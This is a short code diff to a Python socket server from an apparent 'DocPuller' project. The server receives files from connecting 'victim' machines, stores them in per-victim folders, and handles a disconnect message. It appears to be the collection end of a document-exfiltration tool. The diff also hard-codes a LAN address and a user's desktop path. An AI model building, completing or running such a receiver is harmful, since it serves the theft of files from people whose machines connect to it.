@@ -4,7 +4,7 @@ import os
 import socket
 import threading
 
-from real.DocPullerScripts.DocPullerFTP.protocol import Protocol
+from DocPullerScripts.DocPullerFTP.protocol import Protocol
 
 
 class Server(Protocol):
@@ -27,13 +27,14 @@ class Server(Protocol):
         folder = self.__open_victim_folder(addr)
         while connected:
             file_name, file_data = self.recv_file(conn)
-            if file_name :
+            if file_name.decode() == self.DISCONNECT_MSG:
+                connected = False
+            if file_name:
                 file_name = file_name.decode()
                 print('----------------------------------------')
                 print('getting...', file_name)
                 with open(f'{folder}/{file_name}', 'wb') as f:
                     f.write(file_data)
-
 
         conn.close()
 
@@ -52,4 +53,4 @@ class Server(Protocol):
 
 if __name__ == '__main__':
     print('SERVER IS STARTING :)')
-    Server('192.168.1.133', 8830,'/Users/benalaluf/Desktop').start()
+    Server('192.168.1.133', 8830, '/Users/benalaluf/Desktop').start()
